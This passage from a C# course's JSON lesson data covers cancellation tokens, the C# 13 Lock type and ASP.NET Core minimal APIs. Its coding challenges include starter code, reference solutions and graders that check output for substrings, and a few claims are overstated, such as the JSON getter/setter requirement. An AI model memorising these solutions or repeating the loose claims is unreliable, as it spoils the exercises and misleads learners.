              "starterCode": "using System;\nusing System.Threading;\nusing System.Threading.Tasks;\n\nasync Task ProcessFilesAsync(int fileCount, CancellationToken cancellationToken, IProgress<int> progress)\n{\n    for (int i = 0; i < fileCount; i++)\n    {\n        // Check cancellation\n        \n        // Process file\n        Console.WriteLine(\"Processing file \" + (i + 1) + \"...\");\n        await Task.Delay(500, cancellationToken);\n        \n        // Report progress\n        int percentComplete = (i + 1) * 100 / fileCount;\n        progress?.Report(percentComplete);\n    }\n    Console.WriteLine(\"All files processed!\");\n}\n\n// Create cancellation source\nCancellationTokenSource cts = new CancellationTokenSource();\n\n// Create progress reporter\nvar progress = new Progress<int>(percent =>\n{\n    Console.WriteLine(\"Progress: \" + percent + \"%\");\n});\n\n// Start processing\nTask task = ProcessFilesAsync(10, cts.Token, progress);\n\n// Cancel after 3 seconds\ncts.CancelAfter(3000);\n\ntry\n{\n    await task;\n    Console.WriteLine(\"Processing completed successfully!\");\n}\ncatch (OperationCanceledException)\n{\n    Console.WriteLine(\"Processing was cancelled!\");\n}",
              "solution": "using System;\nusing System.Threading;\nusing System.Threading.Tasks;\n\nasync Task ProcessFilesAsync(int fileCount, CancellationToken cancellationToken, IProgress<int> progress)\n{\n    for (int i = 0; i < fileCount; i++)\n    {\n        cancellationToken.ThrowIfCancellationRequested();\n        \n        Console.WriteLine(\"Processing file \" + (i + 1) + \"...\");\n        await Task.Delay(500, cancellationToken);\n        \n        int percentComplete = (i + 1) * 100 / fileCount;\n        progress?.Report(percentComplete);\n    }\n    Console.WriteLine(\"All files processed!\");\n}\n\nCancellationTokenSource cts = new CancellationTokenSource();\n\nvar progress = new Progress<int>(percent =>\n{\n    Console.WriteLine(\"Progress: \" + percent + \"%\");\n});\n\nTask task = ProcessFilesAsync(10, cts.Token, progress);\n\ncts.CancelAfter(3000);\n\ntry\n{\n    await task;\n    Console.WriteLine(\"Processing completed successfully!\");\n}\ncatch (OperationCanceledException)\n{\n    Console.WriteLine(\"\\nProcessing was cancelled!\");\n}\n\ncts.Dispose();",
              "language": "csharp",
              "testCases": [
                {
                  "id": "test-1",
                  "description": "Output should contain \"Processing file\"",
                  "expectedOutput": "Processing file",
                  "isVisible": true
                },
                {
                  "id": "test-2",
                  "description": "Output should contain \"Progress\"",
                  "expectedOutput": "Progress",
                  "isVisible": true
                },
                {
                  "id": "test-3",
                  "description": "Output should contain \"cancelled\"",
                  "expectedOutput": "cancelled",
                  "isVisible": true
                }
              ],
              "hints": [
                {
                  "level": 1,
                  "text": "CancellationToken: check with 'token.ThrowIfCancellationRequested()'. Progress: 'progress?.Report(value)'. Cancel: 'cts.CancelAfter(ms)'. Catch OperationCanceledException!"
                },
                {
                  "level": 2,
                  "text": "Not checking cancellation token: If you accept CancellationToken but never check it, cancellation won't work! Call ThrowIfCancellationRequested() regularly, especially in loops."
                },
                {
                  "level": 3,
                  "text": "Forgetting to dispose CancellationTokenSource: CTS implements IDisposable. Always dispose: 'cts.Dispose()' or use 'using'. Leaking these can cause memory issues."
                },
                {
                  "level": 4,
                  "text": "Progress deadlocks in UI: Progress<T> marshals to original context (usually UI thread). If UI thread is blocked, progress updates queue up. Always await, never block!"
                },
                {
                  "level": 5,
                  "text": "Swallowing OperationCanceledException: Don't catch and ignore this! It's expected behavior. Catch it only to clean up or log, then let it propagate (or handle gracefully)."
                }
              ],
              "commonMistakes": [
                {
                  "mistake": "Not checking cancellation token",
                  "consequence": "If you accept CancellationToken but never check it, cancellation won't work! Call ThrowIfCancellationRequested() regularly, especially in loops.",
                  "correction": "Review the correct syntax and best practices for this concept."
                },
                {
                  "mistake": "Forgetting to dispose CancellationTokenSource",
                  "consequence": "CTS implements IDisposable. Always dispose: 'cts.Dispose()' or use 'using'. Leaking these can cause memory issues.",
                  "correction": "Review the correct syntax and best practices for this concept."
                },
                {
                  "mistake": "Progress deadlocks in UI",
                  "consequence": "Progress<T> marshals to original context (usually UI thread). If UI thread is blocked, progress updates queue up. Always await, never block!",
                  "correction": "Review the correct syntax and best practices for this concept."
                },
                {
                  "mistake": "Swallowing OperationCanceledException",
                  "consequence": "Don't catch and ignore this! It's expected behavior. Catch it only to clean up or log, then let it propagate (or handle gracefully).",
                  "correction": "Review the correct syntax and best practices for this concept."
                }
              ],
              "difficulty": "intermediate"
            }
          ]
        },
        {
          "id": "lesson-10-05",
          "title": "Thread Safety with the Lock Type (C# 13)",
          "moduleId": "module-10",
          "order": 5,
          "estimatedMinutes": 15,
          "difficulty": "intermediate",
          "contentSections": [
            {
              "type": "ANALOGY",
              "title": "Understanding the Concept",
              "content": "Imagine a single bathroom in a busy office:\n\n- Only ONE person can use it at a time\n- When you enter, you LOCK the door\n- Others must WAIT until you unlock and exit\n- Without locking, chaos! (Multiple people entering simultaneously!)\n\nThat's thread synchronization!\n\nWHY DO WE NEED LOCKS?\n- Multiple threads can access shared data simultaneously\n- Without synchronization = race conditions, corrupted data!\n- Lock ensures only ONE thread executes critical code at a time\n\nOLD WAY (Before C# 13):\n- Use 'object' as a lock: private readonly object _lock = new();\n- Works, but it's a workaround (object wasn't designed for this!)\n\nNEW WAY (C# 13):\n- Dedicated Lock type: private readonly Lock _lock = new();\n- Purpose-built for synchronization\n- Cleaner API, compiler optimizations, better intent!\n\nThink: Lock = 'The bathroom door lock that ensures only one person (thread) can enter at a time!'"
            },
            {
              "type": "THEORY",
              "title": "The New System.Threading.Lock Type",
              "content": "## C# 13 Lock Type - What's New?\n\n**Why a dedicated Lock type?**\n1. **Clearer intent**: `Lock` explicitly says 'this is for synchronization'\n2. **Compiler optimizations**: The compiler can generate more efficient code\n3. **Better API**: Purpose-built methods like `EnterScope()`\n4. **Type safety**: Can't accidentally use wrong object as lock\n\n**The old approach (still works, but outdated):**\n```csharp\nprivate readonly object _syncLock = new();\nlock (_syncLock) { /* critical section */ }\n```\n\n**The new C# 13 approach:**\n```csharp\nprivate readonly Lock _lock = new();\nlock (_lock) { /* critical section - optimized! */ }\n```\n\n**EnterScope() pattern:**\n```csharp\nusing (_lock.EnterScope())\n{\n    // Critical section - automatically released!\n}\n```\n\n**When to use locks:**\n- Accessing shared mutable state from multiple threads\n- Incrementing counters, modifying collections\n- Any read-modify-write operation\n\n**Best practices:**\n- Keep critical sections SHORT\n- Always use `readonly` for lock objects\n- Don't lock on `this` or public objects\n- Prefer `Lock` over `object` in new C# 13+ code"
            },
            {
              "type": "EXAMPLE",
              "title": "Modern Thread Safety with Lock (C# 13)",
              "content": "C# 13 introduces the dedicated Lock type for cleaner, more efficient synchronization.",
              "code": "using System;\nusing System.Threading;\nusing System.Threading.Tasks;\n\n// ===== PROBLEM: Race condition without lock =====\nclass UnsafeCounter\n{\n    private int _count = 0;\n    \n    public void Increment()\n    {\n        // DANGER! Not thread-safe!\n        // Multiple threads can read same value,\n        // increment it, and write back - losing updates!\n        _count++;\n    }\n    \n    public int Count => _count;\n}\n\n// ===== OLD WAY: Using object as lock =====\nclass OldStyleCounter\n{\n    private int _count = 0;\n    private readonly object _syncLock = new();  // Object as lock\n    \n    public void Increment()\n    {\n        lock (_syncLock)  // Only one thread at a time\n        {\n            _count++;  // Now thread-safe!\n        }\n    }\n    \n    public int Count\n    {\n        get\n        {\n            lock (_syncLock)\n            {\n                return _count;\n            }\n        }\n    }\n}\n\n// ===== NEW WAY: C# 13 dedicated Lock type =====\nclass ModernCounter\n{\n    private int _count = 0;\n    private readonly Lock _lock = new();  // Purpose-built Lock type!\n    \n    public void Increment()\n    {\n        lock (_lock)  // Compiler optimized!\n        {\n            _count++;\n        }\n    }\n    \n    // Alternative: EnterScope() pattern\n    public void IncrementWithScope()\n    {\n        using (_lock.EnterScope())  // Auto-released when scope exits\n        {\n            _count++;\n        }\n    }\n    \n    public int Count\n    {\n        get\n        {\n            lock (_lock)\n            {\n                return _count;\n            }\n        }\n    }\n}\n\n// ===== DEMONSTRATION =====\nvar counter = new ModernCounter();\nvar tasks = new List<Task>();\n\nConsole.WriteLine(\"Starting 100 tasks, each incrementing 1000 times...\");\n\nfor (int i = 0; i < 100; i++)\n{\n    tasks.Add(Task.Run(() =>\n    {\n        for (int j = 0; j < 1000; j++)\n        {\n            counter.Increment();\n        }\n    }));\n}\n\nawait Task.WhenAll(tasks);\n\nConsole.WriteLine($\"Final count: {counter.Count}\");\nConsole.WriteLine($\"Expected: 100000\");\nConsole.WriteLine(counter.Count == 100000 ? \"SUCCESS! Lock prevented race conditions!\" : \"ERROR: Race condition occurred!\");",
              "language": "csharp"
            },
            {
              "type": "THEORY",
              "title": "Lock vs Other Synchronization Options",
              "content": "## When to Use What?\n\n**Lock (C# 13) / lock statement:**\n- Simple mutual exclusion\n- Short critical sections\n- Most common choice for thread safety\n\n**SemaphoreSlim:**\n- Limit concurrent access (e.g., max 5 threads)\n- Async-friendly with WaitAsync()\n\n**ReaderWriterLockSlim:**\n- Many readers, few writers scenario\n- Readers don't block each other\n\n**Interlocked:**\n- Simple atomic operations (increment, compare-exchange)\n- No lock overhead for single operations\n- Example: `Interlocked.Increment(ref _count);`\n\n**Monitor:**\n- More control than lock (TryEnter, Wait, Pulse)\n- lock statement is syntactic sugar for Monitor\n\n**Concurrent collections:**\n- ConcurrentDictionary, ConcurrentQueue, etc.\n- Built-in thread safety for collections\n\n**Rule of thumb:**\n- Start with `Lock` (C# 13) or `lock` for simple cases\n- Use `Interlocked` for single atomic operations\n- Use concurrent collections for thread-safe data structures\n- Consider other primitives for complex scenarios"
            },
            {
              "type": "WARNING",
              "title": "Thread Safety Dangers",
              "content": "## Critical Lock Mistakes!\n\n**1. NEVER lock on 'this' or public objects!**\n```csharp\nlock (this) { }  // DANGEROUS! External code can deadlock you!\nlock (typeof(MyClass)) { }  // DANGEROUS! Global lock!\n```\nAlways use private readonly lock objects!\n\n**2. NEVER lock on strings!**\n```csharp\nlock (\"mylock\") { }  // DANGEROUS! String interning means\n                     // unrelated code might lock on same object!\n```\n\n**3. Don't hold locks for long operations!**\n```csharp\nlock (_lock)\n{\n    await Task.Delay(5000);  // WRONG! Never await inside lock!\n    Thread.Sleep(5000);       // WRONG! Blocks all other threads!\n}\n```\nLocks should protect SHORT, FAST operations only.\n\n**4. Watch for deadlocks with multiple locks!**\n```csharp\n// Thread 1: lock(A) then lock(B)\n// Thread 2: lock(B) then lock(A)\n// DEADLOCK! Each waits for the other!\n```\nAlways acquire locks in the SAME ORDER everywhere.\n\n**5. The C# 13 Lock type requires .NET 9!**\n`System.Threading.Lock` is only available in .NET 9+. For earlier versions, use the classic `object` lock pattern.\n\n**6. Lock doesn't make everything thread-safe!**\nReturning references to internal data can break thread safety even with locks. Return copies, not references!"
            }
          ],
          "challenges": [
            {
              "type": "FREE_CODING",
              "id": "lesson-10-05-challenge-01",
              "title": "Thread-Safe Bank Account",
              "description": "Build a thread-safe bank account using the C# 13 Lock type.",
              "instructions": "Create a thread-safe BankAccount class!\n\n1. Create 'BankAccount' class with:\n   - private decimal _balance field\n   - private readonly Lock _lock field (C# 13 Lock type)\n   - public decimal Balance property (thread-safe read)\n   - public void Deposit(decimal amount) method (thread-safe)\n   - public bool Withdraw(decimal amount) method (thread-safe, return false if insufficient funds)\n\n2. In main code:\n   - Create account with initial balance of 1000\n   - Start 10 tasks that each deposit 100 (total +1000)\n   - Start 10 tasks that each withdraw 50 (total -500)\n   - Wait for all tasks\n   - Print final balance (should be 1500)\n\nUse 'lock (_lock)' or '_lock.EnterScope()' to protect critical sections!",
              "starterCode": "using System;\nusing System.Threading;\nusing System.Threading.Tasks;\nusing System.Collections.Generic;\n\nclass BankAccount\n{\n    private decimal _balance;\n    private readonly Lock _lock = new();\n    \n    public BankAccount(decimal initialBalance)\n    {\n        _balance = initialBalance;\n    }\n    \n    public decimal Balance\n    {\n        get\n        {\n            // TODO: Make thread-safe\n            return _balance;\n        }\n    }\n    \n    public void Deposit(decimal amount)\n    {\n        // TODO: Make thread-safe\n        _balance += amount;\n        Console.WriteLine($\"Deposited {amount}, Balance: {_balance}\");\n    }\n    \n    public bool Withdraw(decimal amount)\n    {\n        // TODO: Make thread-safe, check for sufficient funds\n        if (_balance >= amount)\n        {\n            _balance -= amount;\n            Console.WriteLine($\"Withdrew {amount}, Balance: {_balance}\");\n            return true;\n        }\n        return false;\n    }\n}\n\nvar account = new BankAccount(1000);\nvar tasks = new List<Task>();\n\nConsole.WriteLine($\"Initial balance: {account.Balance}\");\n\n// Start deposit tasks\nfor (int i = 0; i < 10; i++)\n{\n    tasks.Add(Task.Run(() => account.Deposit(100)));\n}\n\n// Start withdraw tasks\nfor (int i = 0; i < 10; i++)\n{\n    tasks.Add(Task.Run(() => account.Withdraw(50)));\n}\n\nawait Task.WhenAll(tasks);\n\nConsole.WriteLine($\"\\nFinal balance: {account.Balance}\");\nConsole.WriteLine($\"Expected: 1500\");",
              "solution": "using System;\nusing System.Threading;\nusing System.Threading.Tasks;\nusing System.Collections.Generic;\n\nclass BankAccount\n{\n    private decimal _balance;\n    private readonly Lock _lock = new();\n    \n    public BankAccount(decimal initialBalance)\n    {\n        _balance = initialBalance;\n    }\n    \n    public decimal Balance\n    {\n        get\n        {\n            lock (_lock)\n            {\n                return _balance;\n            }\n        }\n    }\n    \n    public void Deposit(decimal amount)\n    {\n        lock (_lock)\n        {\n            _balance += amount;\n            Console.WriteLine($\"Deposited {amount}, Balance: {_balance}\");\n        }\n    }\n    \n    public bool Withdraw(decimal amount)\n    {\n        lock (_lock)\n        {\n            if (_balance >= amount)\n            {\n                _balance -= amount;\n                Console.WriteLine($\"Withdrew {amount}, Balance: {_balance}\");\n                return true;\n            }\n            Console.WriteLine($\"Insufficient funds for {amount}\");\n            return false;\n        }\n    }\n}\n\nvar account = new BankAccount(1000);\nvar tasks = new List<Task>();\n\nConsole.WriteLine($\"Initial balance: {account.Balance}\");\nConsole.WriteLine(\"Starting concurrent operations...\\n\");\n\nfor (int i = 0; i < 10; i++)\n{\n    tasks.Add(Task.Run(() => account.Deposit(100)));\n}\n\nfor (int i = 0; i < 10; i++)\n{\n    tasks.Add(Task.Run(() => account.Withdraw(50)));\n}\n\nawait Task.WhenAll(tasks);\n\nConsole.WriteLine($\"\\nFinal balance: {account.Balance}\");\nConsole.WriteLine($\"Expected: 1500\");\nConsole.WriteLine(account.Balance == 1500 ? \"SUCCESS!\" : \"Race condition detected!\");",
              "language": "csharp",
              "testCases": [
                {
                  "id": "test-1",
                  "description": "Output should contain initial balance",
                  "expectedOutput": "Initial balance",
                  "isVisible": true
                },
                {
                  "id": "test-2",
                  "description": "Output should contain deposit operations",
                  "expectedOutput": "Deposited",
                  "isVisible": true
                },
                {
                  "id": "test-3",
                  "description": "Output should contain final balance",
                  "expectedOutput": "Final balance",
                  "isVisible": true
                },
                {
                  "id": "test-4",
                  "description": "Final balance should be 1500",
                  "expectedOutput": "1500",
                  "isVisible": true
                }
              ],
              "hints": [
                {
                  "level": 1,
                  "text": "Lock syntax: 'lock (_lock) { /* code */ }'. All reads AND writes to _balance must be inside lock blocks. The Lock type is in System.Threading namespace."
                },
                {
                  "level": 2,
                  "text": "EnterScope alternative: 'using (_lock.EnterScope()) { /* code */ }'. The lock is automatically released when the using block exits, even if exception occurs."
                },
                {
                  "level": 3,
                  "text": "Don't forget the Balance getter! Reading _balance outside a lock can return stale/torn values. ALWAYS protect shared mutable state, even for reads."
                },
                {
                  "level": 4,
                  "text": "Withdraw check-then-act: The balance check AND subtraction must be in the SAME lock block. If you check outside, another thread might withdraw between check and action!"
                }
              ],
              "commonMistakes": [
                {
                  "mistake": "Not locking read operations",
                  "consequence": "Reading shared state without lock can return stale or torn (partially updated) values! Always lock both reads AND writes to shared mutable state.",
                  "correction": "Wrap the Balance getter in lock (_lock) { return _balance; }"
                },
                {
                  "mistake": "Check-then-act outside single lock",
                  "consequence": "If you check balance in one lock block and withdraw in another, the balance could change between check and action! This is a classic race condition.",
                  "correction": "Put the entire check-and-withdraw logic in a single lock block: lock (_lock) { if (_balance >= amount) { _balance -= amount; } }"
                },
                {
                  "mistake": "Using old object lock syntax in C# 13",
                  "consequence": "While 'object _lock = new()' still works, it misses compiler optimizations and doesn't clearly communicate intent. The Lock type is purpose-built for synchronization.",
                  "correction": "Use 'private readonly Lock _lock = new();' in C# 13+ for cleaner code and better performance."
                },
                {
                  "mistake": "Locking on 'this' or public objects",
                  "consequence": "External code could lock on the same object, causing deadlocks! Never lock on 'this', typeof(Type), or public fields. Always use private lock objects.",
                  "correction": "Always use: 'private readonly Lock _lock = new();' - private and readonly ensures only your code can use it."
                }
              ],
              "difficulty": "intermediate"
            }
          ]
        }
      ]
    },
    {
      "id": "module-11",
      "title": "ASP.NET Core & Web APIs",
      "description": "Build web applications and RESTful APIs using ASP.NET Core with minimal APIs, routing, and HTTP handling.",
      "difficulty": "beginner",
      "estimatedHours": 2,
      "lessons": [
        {
          "id": "lesson-11-01",
          "title": "What is ASP.NET Core? (The Web Application Factory)",
          "moduleId": "module-11",
          "order": 1,
          "estimatedMinutes": 15,
          "difficulty": "advanced",
          "contentSections": [
            {
              "type": "ANALOGY",
              "title": "Understanding the Concept",
              "content": "Imagine a restaurant:\n• KITCHEN prepares food (your business logic)\n• WAITERS take orders and deliver food (HTTP handles requests/responses)\n• MENU lists what's available (your API endpoints)\n• CUSTOMERS make requests (web browsers, mobile apps, other services)\n\nThat's ASP.NET Core! It's a framework for building WEB APPLICATIONS and APIS:\n\nWEB API = Application Programming Interface for the web\n• Not a visual website (no HTML/CSS)\n• Returns DATA (JSON, XML)\n• Other apps consume your API (mobile apps, frontend frameworks, other services)\n\nASP.NET Core 9 features:\n• MINIMAL APIs - Simple, lightweight endpoint definitions (93% less memory allocation!)\n• FAST - One of the fastest web frameworks (benchmarked!)\n• CROSS-PLATFORM - Runs on Windows, Linux, Mac\n• BUILT-IN features: Logging, DI, Configuration, OpenAPI\n• TypedResults - Strongly-typed responses with automatic OpenAPI metadata\n• Native AOT - Compile to native code for instant startup\n\nThink: ASP.NET Core = 'The factory that creates web services that speak HTTP and return data!'"
            },
            {
              "type": "EXAMPLE",
              "title": "Code Example",
              "content": "This example demonstrates the concepts in action.",
              "code": "// MINIMAL API in ASP.NET Core 9 (.NET 9)\n// File: Program.cs\n\nvar builder = WebApplication.CreateBuilder(args);\n\n// Add OpenAPI support (.NET 9)\nbuilder.Services.AddOpenApi();\n\nvar app = builder.Build();\n\n// Map OpenAPI endpoint\napp.MapOpenApi();\n\n// ENDPOINT 1: Simple GET request\napp.MapGet(\"/\", () => \"Hello from ASP.NET Core 9!\");\n\n// ENDPOINT 2: GET with route parameter\napp.MapGet(\"/hello/{name}\", (string name) => \n{\n    return $\"Hello, {name}!\";\n});\n\n// ENDPOINT 3: Returning JSON object\napp.MapGet(\"/api/user\", () => \n{\n    return new { Id = 1, Name = \"Alice\", Email = \"alice@example.com\" };\n});\n\n// ENDPOINT 4: List of data\napp.MapGet(\"/api/products\", () => \n{\n    var products = new[]\n    {\n        new { Id = 1, Name = \"Laptop\", Price = 999.99 },\n        new { Id = 2, Name = \"Mouse\", Price = 29.99 },\n        new { Id = 3, Name = \"Keyboard\", Price = 79.99 }\n    };\n    return products;\n});\n\n// ENDPOINT 5: Query parameters with TypedResults (.NET 7+)\n// TypedResults provides compile-time type safety and auto OpenAPI metadata!\napp.MapGet(\"/api/search\", (string? query) => \n{\n    if (string.IsNullOrEmpty(query))\n        return TypedResults.BadRequest(\"Query parameter required!\");\n    \n    return TypedResults.Ok($\"Searching for: {query}\");\n});\n\napp.Run();  // Start the web server!\n\n// Access in browser:\n// http://localhost:5000/\n// http://localhost:5000/hello/Bob\n// http://localhost:5000/api/user\n// http://localhost:5000/api/products\n// http://localhost:5000/api/search?query=laptop\n// http://localhost:5000/openapi/v1.json (API docs!)",
              "language": "csharp"
            },
            {
              "type": "THEORY",
              "title": "Syntax Breakdown",
              "content": "## Breaking Down the Syntax\n\n**`WebApplication.CreateBuilder(args)`**: Creates the web application builder. Configures services, logging, configuration. This is the foundation of your app.\n\n**`app.MapGet(route, handler)`**: Defines a GET endpoint. Route is URL pattern (\\\"/api/users\\\"). Handler is lambda that returns response. ASP.NET Core automatically converts to JSON!\n\n**`Route parameters: {name}`**: Curly braces in route = parameter! /hello/{name} matches /hello/Bob. Parameter value passed to handler: (string name) => ...\n\n**`TypedResults vs Results`**: TypedResults (recommended!) returns strongly-typed objects. Better for: compile-time checking, unit testing, automatic OpenAPI docs. Example: TypedResults.Ok(data) instead of Results.Ok(data).\n\n**`app.Run()`**: Starts the web server! Listens for HTTP requests. Runs until stopped (Ctrl+C). This MUST be the last line!"
            },
            {
              "type": "WARNING",
              "title": "Common Pitfalls",
              "content": "## Watch Out For These Issues!\n\n**Port conflicts**: Default ports 5000/5001 might be in use! Check error messages. Use 'builder.WebHost.UseUrls(\"http://localhost:5050\")' to change.\n\n**HTTPS in development**: Browser may block HTTP. Use 'dotnet dev-certs https --trust' to trust dev certificates.\n\n**Results vs TypedResults**: Results.Ok() returns IResult (untyped). TypedResults.Ok() returns Ok<T> (typed). TypedResults gives better OpenAPI docs and compile-time safety - prefer it!\n\n**Forgetting app.Run()**: Without it, server never starts! Must be LAST line after all MapGet/MapPost calls.\n\n**JSON serialization issues**: Properties must be public with { get; set; } for JSON serialization. Private properties won't appear in response!"
            }
          ],
          "challenges": [
            {
              "type": "FREE_CODING",
              "id": "lesson-11-01-challenge-01",
              "title": "Practice Challenge",
              "description": "Apply what you've learned in this interactive coding challenge.",
              "instructions": "Create your first ASP.NET Core API!\n\n1. Create web application builder and app\n\n2. Create these endpoints:\n   - GET / -> Return \"Welcome to my API!\"\n   - GET /api/time -> Return current DateTime as JSON\n   - GET /api/greet/{name} -> Return greeting with name\n   - GET /api/math/add?a=5&b=3 -> Return sum of two numbers\n   - GET /api/products -> Return array of 3 product objects (Id, Name, Price)\n\n3. Run the application with app.Run()\n\nNOTE: For the learning platform, simulate endpoint behavior by printing what each would return!",
              "starterCode": "using Microsoft.AspNetCore.Builder;\n\nvar builder = WebApplication.CreateBuilder(args);\nvar app = builder.Build();\n\n// Endpoint 1: Root\napp.MapGet(\"/\", () => /* return value */);\n\n// Endpoint 2: Current time\napp.MapGet(\"/api/time\", () => \n{\n    // Return DateTime.Now as anonymous object\n});\n\n// Endpoint 3: Greet with name parameter\napp.MapGet(\"/api/greet/{name}\", (string name) => \n{\n    // Return greeting\n});\n\n// Endpoint 4: Add two numbers from query\napp.MapGet(\"/api/math/add\", (int a, int b) => \n{\n    // Return sum\n});\n\n// Endpoint 5: Product list\napp.MapGet(\"/api/products\", () => \n{\n    // Return array of products\n});\n\nConsole.WriteLine(\"API endpoints created!\");\nConsole.WriteLine(\"Endpoints available:\");\nConsole.WriteLine(\"  GET /\");\nConsole.WriteLine(\"  GET /api/time\");\nConsole.WriteLine(\"  GET /api/greet/{name}\");\nConsole.WriteLine(\"  GET /api/math/add?a=5&b=3\");\nConsole.WriteLine(\"  GET /api/products\");",
              "solution": "using Microsoft.AspNetCore.Builder;\nusing System;\n\nvar builder = WebApplication.CreateBuilder(args);\nvar app = builder.Build();\n\napp.MapGet(\"/\", () => \"Welcome to my API!\");\n\napp.MapGet(\"/api/time\", () => \n{\n    return new { CurrentTime = DateTime.Now };\n});\n\napp.MapGet(\"/api/greet/{name}\", (string name) => \n{\n    return $\"Hello, {name}! Welcome to the API.\";\n});\n\napp.MapGet(\"/api/math/add\", (int a, int b) => \n{\n    return new { A = a, B = b, Sum = a + b };\n});\n\napp.MapGet(\"/api/products\", () => \n{\n    var products = new[]\n    {\n        new { Id = 1, Name = \"Laptop\", Price = 999.99 },\n        new { Id = 2, Name = \"Mouse\", Price = 29.99 },\n        new { Id = 3, Name = \"Keyboard\", Price = 79.99 }\n    };\n    return products;\n});\n\nConsole.WriteLine(\"API endpoints created!\");\nConsole.WriteLine(\"Endpoints available:\");\nConsole.WriteLine(\"  GET /\");\nConsole.WriteLine(\"  GET /api/time\");\nConsole.WriteLine(\"  GET /api/greet/Bob\");\nConsole.WriteLine(\"  GET /api/math/add?a=5&b=3\");\nConsole.WriteLine(\"  GET /api/products\");",
              "language": "csharp",
              "testCases": [
                {
                  "id": "test-1",
                  "description": "Output should contain \"API endpoints\"",
                  "expectedOutput": "API endpoints",
                  "isVisible": true
                },
                {
                  "id": "test-2",
                  "description": "Output should contain \"available\"",
                  "expectedOutput": "available",
                  "isVisible": true
                },
                {
                  "id": "test-3",
                  "description": "Output should contain \"/api/\"",
                  "expectedOutput": "/api/",
                  "isVisible": true
                }
              ],
              "hints": [
                {
                  "level": 1,
                  "text": "Create builder and app. MapGet: app.MapGet(route, handler). Route params: /api/{param}. Query params: (int a, int b) from ?a=5&b=3. Return objects - auto-converted to JSON!"
                },
                {
                  "level": 2,
                  "text": "Forgetting app.Run(): Without app.Run() at the end, server doesn't start! It MUST be the last line in Program.cs. Server won't listen for requests without it."
                },
                {
                  "level": 3,
                  "text": "Route casing: Routes are case-INSENSITIVE by default! /API/Products and /api/products are the same. But parameters ARE case-sensitive in C# handler!"
                },
                {
                  "level": 4,
                  "text": "Missing using statements: Need 'using Microsoft.AspNetCore.Builder;' and others. If IDE shows red underlines, you're missing package references or usings!"
                },
                {
                  "level": 5,
                  "text": "Query parameter types: Query params auto-bind to handler parameters! ?a=5&b=3 with (int a, int b) works automatically. Wrong type (string when expecting int) = 400 Bad Request."
                }
              ],
              "commonMistakes": [
                {
                  "mistake": "Forgetting app.Run()",
                  "consequence": "Without app.Run() at the end, server doesn't start! It MUST be the last line in Program.cs. Server won't listen for requests without it.",
                  "correction": "Review the correct syntax and best practices for this concept."
                },
                {
                  "mistake": "Route casing",
                  "consequence": "Routes are case-INSENSITIVE by default! /API/Products and /api/products are the same. But parameters ARE case-sensitive in C# handler!",
                  "correction": "Review the correct syntax and best practices for this concept."
                },
                {
                  "mistake": "Missing using statements",
                  "consequence": "Need 'using Microsoft.AspNetCore.Builder;' and others. If IDE shows red underlines, you're missing package references or usings!",
                  "correction": "Review the correct syntax and best practices for this concept."
                },
                {
                  "mistake": "Query parameter types",
                  "consequence": "Query params auto-bind to handler parameters! ?a=5&b=3 with (int a, int b) works automatically. Wrong type (string when expecting int) = 400 Bad Request.",
                  "correction": "Review the correct syntax and best practices for this concept."
                }
              ],
              "difficulty": "advanced"
            }
          ]
        },
        {
          "id": "lesson-11-02",
          "title": "Building Your First Minimal API (The Data Menu)",
          "moduleId": "module-11",
          "order": 2,
          "estimatedMinutes": 15,
          "difficulty": "advanced",
          "contentSections": [
            {
              "type": "ANALOGY",
              "title": "Understanding the Concept",
              "content": "Imagine a food delivery app:\n• BROWSE menu (GET /api/menu)\n• VIEW item details (GET /api/menu/5)\n• ADD to cart (POST /api/cart)\n• UPDATE quantity (PUT /api/cart/3)\n• REMOVE from cart (DELETE /api/cart/3)\n\nEach of these is an API ENDPOINT! Together they form your API.\n\nMINIMAL API (.NET 9 style):\n• NO controllers needed!\n• Define endpoints directly in Program.cs\n• Lambda functions handle requests\n• Less boilerplate, more productivity\n• TypedResults for compile-time safety\n• Built-in OpenAPI documentation\n\nIn-memory data store:\n• For learning, use List<T> as database\n• In production, you'd use real database (next module!)\n\nThink: Minimal API = 'Quick, simple way to expose data and functionality over HTTP!'"
            },
            {
              "type": "EXAMPLE",
              "title": "Code Example",
              "content": "This example demonstrates the concepts in action.",
              "code": "using Microsoft.AspNetCore.Builder;\nusing Microsoft.AspNetCore.Http.HttpResults;\nusing System.Collections.Generic;\nusing System.Linq;\n\nvar builder = WebApplication.CreateBuilder(args);\nbuilder.Services.AddOpenApi();  // .NET 9 OpenAPI\nvar app = builder.Build();\napp.MapOpenApi();\n\n// IN-MEMORY DATA (simulates database)\nclass Todo\n{\n    public int Id { get; set; }\n    public string? Title { get; set; }\n    public bool IsComplete { get; set; }\n}\n\nvar todos = new List<Todo>\n{\n    new Todo { Id = 1, Title = \"Learn C#\", IsComplete = true },\n    new Todo { Id = 2, Title = \"Build API\", IsComplete = false },\n    new Todo { Id = 3, Title = \"Deploy app\", IsComplete = false }\n};\n\n// GET all todos - TypedResults auto-generates OpenAPI docs!\napp.MapGet(\"/api/todos\", () => TypedResults.Ok(todos));\n\n// GET single todo by ID - TypedResults for type safety\napp.MapGet(\"/api/todos/{id}\", Results<Ok<Todo>, NotFound> (int id) =>\n{\n    var todo = todos.FirstOrDefault(t => t.Id == id);\n    return todo is not null \n        ? TypedResults.Ok(todo) \n        : TypedResults.NotFound();\n});\n\n// GET completed todos only\napp.MapGet(\"/api/todos/completed\", () => \n{\n    return TypedResults.Ok(todos.Where(t => t.IsComplete));\n});\n\n// Count todos\napp.MapGet(\"/api/todos/count\", () => \n{\n    return TypedResults.Ok(new { Total = todos.Count, Completed = todos.Count(t => t.IsComplete) });\n});\n\napp.Run();\n\n// Try these URLs:\n// http://localhost:5000/api/todos\n// http://localhost:5000/api/todos/1\n// http://localhost:5000/api/todos/completed\n// http://localhost:5000/api/todos/count\n// http://localhost:5000/openapi/v1.json (auto-generated docs!)",
              "language": "csharp"
            },
            {
              "type": "THEORY",
              "title": "Syntax Breakdown",
              "content": "## Breaking Down the Syntax\n\n**`TypedResults.Ok(value)`**: Returns 200 OK with strongly-typed response. Prefer over Results.Ok() for: compile-time safety, better unit tests, auto OpenAPI metadata!\n\n**`Results<Ok<T>, NotFound>`**: Union return type! Tells compiler AND OpenAPI exactly what this endpoint can return. No more guessing!\n\n**`TypedResults.NotFound()`**: Returns 404 Not Found status. Use when resource doesn't exist. TypedResults version generates accurate API documentation!\n\n**`FirstOrDefault() with null check`**: LINQ method returns first match or null. Use 'is not null' pattern matching to check. Modern C# syntax!\n\n**`In-memory data store`**: List<T> simulates database for learning. Changes persist during app lifetime. Restarting app resets data. Use real DB in production!"
            },
            {
